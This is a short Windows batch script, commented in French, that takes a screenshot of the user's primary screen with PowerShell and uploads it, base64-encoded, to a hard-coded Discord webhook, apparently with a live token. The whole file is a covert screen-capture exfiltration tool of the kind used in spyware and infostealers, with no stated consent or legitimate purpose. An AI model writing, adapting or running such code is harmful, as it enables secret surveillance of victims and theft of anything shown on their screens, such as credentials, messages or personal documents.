@echo off
setlocal enabledelayedexpansion

rem Définir l'URL du webhook Discord
set "webhookUrl=https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF"

rem Définir le chemin d'accès complet pour enregistrer la capture d'écran dans le répertoire temporaire de l'utilisateur
set "fileName=%TEMP%\screenshot.png"

rem Prendre une capture d'écran avec PowerShell et enregistrer l'image
powershell.exe -Command "$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size); $bitmap.Save('%fileName%', [System.Drawing.Imaging.ImageFormat]::Png)"

rem Envoyer la capture d'écran au webhook Discord avec PowerShell
powershell.exe -Command "$webhookUrl = '%webhookUrl%'; $fileName = '%fileName%'; $fileBytes = [System.IO.File]::ReadAllBytes($fileName); $base64File = [System.Convert]::ToBase64String($fileBytes); $json = '{\"content\":\"\",\"embeds\":[{\"title\":\"Capture d\'écran\",\"image\":{\"url\":\"data:image/png;base64,' + $base64File + '\"}}]}'; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType 'application/json'"

echo Capture d'écran envoyée avec succès au webhook Discord.
